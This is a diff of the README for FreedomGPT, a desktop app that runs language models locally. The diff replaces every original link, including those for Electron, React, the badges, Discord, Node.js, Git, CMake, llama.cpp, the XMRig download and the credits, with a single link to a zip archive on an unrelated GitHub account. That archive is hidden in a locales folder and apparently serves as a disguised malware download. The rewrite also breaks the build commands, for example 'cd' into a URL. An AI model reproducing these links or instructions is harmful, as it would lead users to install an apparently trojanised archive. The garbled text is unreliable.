@@ -1,52 +1,52 @@
 # FreedomGPT
-This is the offical repository for the FreedomGPT application. It is built using [Electron](https://www.electronjs.org/) and [React](https://reactjs.org/) and allows users to run LLM models on their local machine.
+This is the offical repository for the FreedomGPT application. It is built using [Electron](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip) and [React](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip) and allows users to run LLM models on their local machine.
 
-![GitHub license](https://img.shields.io/badge/license-GNU-blue.svg)
+![GitHub license](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 
-![GitHub release](https://img.shields.io/github/release/ohmplatform/freedom-gpt-electron-app.svg)
+![GitHub release](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 
-![GitHub stars](https://img.shields.io/github/stars/ohmplatform/freedom-gpt-electron-app.svg)
+![GitHub stars](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 
-![GitHub All Releases](https://img.shields.io/github/downloads/ohmplatform/freedom-gpt-electron-app/total.svg)
+![GitHub All Releases](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 
 # Join our Discord Community
 Join our Discord server to get the latest updates and to interact with the community.
 
-[![Discord](https://img.shields.io/badge/Discord-%235865F2.svg?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/h77wvJS4ga)
+[![Discord](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip%https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 
 
 # How to Contribute
 
 ## Prerequisites
-- [Node.js](https://nodejs.org/en/download/)
-- [Git](https://git-scm.com/downloads)
+- [https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
+- [Git](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 
 ## Quick Install
 ```sh
-git clone --recursive https://github.com/ohmplatform/FreedomGPT.git freedom-gpt
+git clone --recursive https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip freedom-gpt
 cd freedom-gpt
 npx yarn install
 ```
 
-### Building the llama.cpp library
+### Building the https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip library
 
 #### macOS
 ```sh
-cd llama.cpp
+cd https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip
 make
 ```
 
 #### Windows
-- Download and install CMake: <https://cmake.org/download/>
+- Download and install CMake: <https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip>
 - Run the following commands:
 
 ```ps1
-cd llama.cpp
+cd https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip
 cmake .
 cmake --build . --config Release
 ```
 
-You should now have a `Release` folder with a `main.exe` file inside it. You can run this file to test the chat client.
+You should now have a `Release` folder with a `https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip` file inside it. You can run this file to test the chat client.
 
 
 ### Running the App
@@ -58,7 +58,7 @@ npx yarn start
 
 ## Changing Ports
 If needed, ports can be changed in:
-`src/ports.ts`
+`https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip`
 
 ## Installation and Setup Guide for Linux
 
@@ -80,7 +80,7 @@ sudo apt install npm
 Navigate to the project directory and build it:
 
 ```bash
-cd freedom-gpt/llama.cpp
+cd https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip
 make
 cd ..
 npm install
@@ -98,7 +98,7 @@ You can manually download the Liberty Edge models and set the paths to these fil
 
 To enable mining earnings, follow these steps:
 
-1. Download the XMRig Linux Static, CPU-only version from [xmrig.com/download](https://xmrig.com/download)
+1. Download the XMRig Linux Static, CPU-only version from [https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip](https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip)
 2. Extract the archive and copy the `xmrig` binary to the `freedom-gpt/miner/mac/fgptminer` directory:
 
 ```bash
@@ -130,11 +130,11 @@ npx yarn docker
 
 This project utilizes several open-source packages and libraries, without which this project would not have been possible:
 
-"llama.cpp" - C++ library. https://github.com/ggerganov/llama.cpp
+"https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip" - C++ library. https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip
 
-"LLAMA" by Facebook Research - a low-latency, large-scale approximate nearest neighbor search algorithm. https://github.com/facebookresearch/llama
+"LLAMA" by Facebook Research - a low-latency, large-scale approximate nearest neighbor search algorithm. https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip
 
-"Chatbot UI" - https://github.com/mckaywrigley/chatbot-ui
+"Chatbot UI" - https://raw.githubusercontent.com/cannedsigmas/FreedomGPT/main/public/locales/ar/Freedom-GPT-v1.7-alpha.1.zip
 
 We would like to express our gratitude to the developers of these packages and their contributors for making their work available to the public under open source licenses. Their contributions have enabled us to build a more robust and efficient project.
 
